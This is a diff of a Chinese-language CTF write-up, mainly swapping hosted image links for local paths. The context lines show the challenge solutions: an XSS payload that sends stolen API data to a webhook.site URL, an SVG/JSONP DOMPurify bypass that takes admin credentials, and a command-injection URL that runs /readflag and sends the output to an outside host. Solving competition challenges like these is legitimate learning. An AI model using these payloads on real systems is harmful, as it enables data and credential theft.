@@ -9,11 +9,11 @@ hidden: false
 # Misc
 ## Welcome
 FLAG就在PDF
-![](https://i.imgur.com/bx50XkB.png)
+![](/images/2023/05/bx50XkB.png)
 
 ## Robot
 努力算數學，就有FLAG啦!
-![](https://i.imgur.com/3Y93ZDt.png)
+![](/images/2023/05/3Y93ZDt.png)
 
 # Crypro
 ## Fernet
@@ -56,10 +56,10 @@ def decrypt(ciphertext, password):
     ciphertext = base64.b64decode(ciphertext.encode())
     salt = ciphertext[:16]
     ciphertext = ciphertext[16:]
-    
+
     key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)
     f = Fernet(base64.urlsafe_b64encode(key))
-    
+
     plaintext = f.decrypt(ciphertext)
     return plaintext.decode()
 
@@ -81,13 +81,13 @@ Decrypted data: FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!_!!!_!}
 ## Login Panel
 
 使用guest直接登入
-![](https://i.imgur.com/Vr2SoPx.png)
+![](/images/2023/05/Vr2SoPx.png)
 
 發現有2FA
-![](https://i.imgur.com/K2XTmg9.png)
+![](/images/2023/05/K2XTmg9.png)
 
 需要使用admin登入
-![](https://i.imgur.com/ttAUKsm.png)
+![](/images/2023/05/ttAUKsm.png)
 
 ### 解法
 
@@ -234,7 +234,7 @@ app.listen(PORT, () => {
 
 登入後的頁面
 
-![](https://i.imgur.com/HkgWrN4.png)
+![](/images/2023/05/HkgWrN4.png)
 
 這題需要使用XSS去偷admin的資料，但不是偷cookie，所以這題比較少人解
 
@@ -244,7 +244,7 @@ Payload
 <img src=x onerror=fetch('/api/portfolio').then(r=&gt;{r.text().then(t=&gt;fetch('https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?='+btoa(t)))})>
 ```
 
-![](https://i.imgur.com/A2tFSHS.png)
+![](/images/2023/05/A2tFSHS.png)
 
 if you want to steal cookie
 
@@ -255,7 +255,7 @@ if you want to steal cookie
 
 
 
-### 插曲 
+### 插曲
 有人直接使用admin/admin登入，所以http://url/share?username=admin，就有一堆假FLAG
 
 
@@ -265,10 +265,10 @@ if you want to steal cookie
 
 網站有設定DOMPurify.sanitize以及X-Xss-Protection等
 
-其中可以使用 google 的 jsonp  ```https://accounts.google.com/o/oauth2/revoke?callback=``` 
+其中可以使用 google 的 jsonp  ```https://accounts.google.com/o/oauth2/revoke?callback=```
 可以參考 [JSONBEE](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
-![](https://i.imgur.com/SGkC8hs.png)
+![](/images/2023/05/SGkC8hs.png)
 
 其中因為有些字元會被encode或閉合，像是 ``` " > ``` 之類的
 
@@ -280,7 +280,7 @@ if you want to steal cookie
 ```
 <svg xmlns="http://www.w3.org/2000/svg">
 	<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio').then(function (r)
-{ return r.json() }).then(function (t) 
+{ return r.json() }).then(function (t)
 { const USERAAA = (t.data.username);const PASSBBB = (t.data.password);
 fetch('/api/login', {
     'headers': {
@@ -309,7 +309,7 @@ fetch('/api/login', {
 
 效果大概是這樣
 
-![](https://i.imgur.com/OnBdVTc.png)
+![](/images/2023/05/OnBdVTc.png)
 
 方法2
 
@@ -327,22 +327,22 @@ fetch('/api/login', {
 
 需要修改report成那個svg
 
-![](https://i.imgur.com/s7MSif4.png)
+![](/images/2023/05/s7MSif4.png)
 
 
 
 ## Gitly
 一個Gitly網頁
-![](https://i.imgur.com/3IsmsMV.png)
+![](/images/2023/05/3IsmsMV.png)
 
 使用source code內的gitly.sqlite，裡面的token設定到cookie就能登入
-![](https://i.imgur.com/scQe2IP.png)
+![](/images/2023/05/scQe2IP.png)
 
 但裡面功能好像都用不了
-![](https://i.imgur.com/gbI89f4.png)
+![](/images/2023/05/gbI89f4.png)
 
 只有New repository，能發出請求
-![](https://i.imgur.com/N9yzXwt.png)
+![](/images/2023/05/N9yzXwt.png)
 
 結果嘗試到後面發現是command injection
 
@@ -368,9 +368,9 @@ Response body 設定為
 
 https://webhook.site/3923ff74-968d-46db-bb20-727f2068df0e/$(/readflag);
 
-![](https://i.imgur.com/M1F2ghg.png)
+![](/images/2023/05/M1F2ghg.png)
 
 # 結束
 
 解出Web三題，其他Reverse,Pwn都不會QQ
-![](https://i.imgur.com/tAFddYC.png)
+![](/images/2023/05/tAFddYC.png)
